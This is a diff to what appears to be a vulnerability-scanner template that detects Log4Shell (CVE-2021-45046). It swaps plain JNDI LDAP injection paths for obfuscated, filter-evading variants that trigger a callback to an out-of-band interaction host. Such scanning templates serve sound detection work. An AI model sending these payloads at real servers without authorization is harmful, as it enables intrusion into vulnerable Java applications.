@@ -15,8 +15,8 @@ info:
 requests:
   - method: GET
     path:
-      - "{{BaseURL}}/$%7Bjndi:ldap:$%7B::-/%7D/{{Host}}.{{interactsh-url}}%7D/"
-      - "{{BaseURL}}/$%7Bjndi:ldap:$%7B::-/%7D/127.0.0.1%23{{Host}}.{{interactsh-url}}%7D/" #CVE-2021-45046
+      - "{{BaseURL}}/$%7B$%7B:,:[:-j%7D$%7B:]:-n%7D$%7B:@:-d%7D$%7B::-i%7D:$%7B:):-l%7D$%7B:":-d%7D$%7B:Chrome:-a%7D$%7B:Mozilla:-p%7D:$%7B:":-/%7D/{{Host}}.{{interactsh-url}}%7D/"
+      - "{{BaseURL}}/$%7B$%7B:,:[:-j%7D$%7B:]:-n%7D$%7B:@:-d%7D$%7B::-i%7D:$%7B:):-l%7D$%7B:":-d%7D$%7B:Chrome:-a%7D$%7B:Mozilla:-p%7D:$%7B:":-/%7D/127.0.0.1%23{{Host}}.{{interactsh-url}}%7D/" #CVE-2021-45046
 
     headers:
        User-Agent: Mozilla/5.0 (X11; CrOS x86_64 8172.45.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.64 Safari/537.36
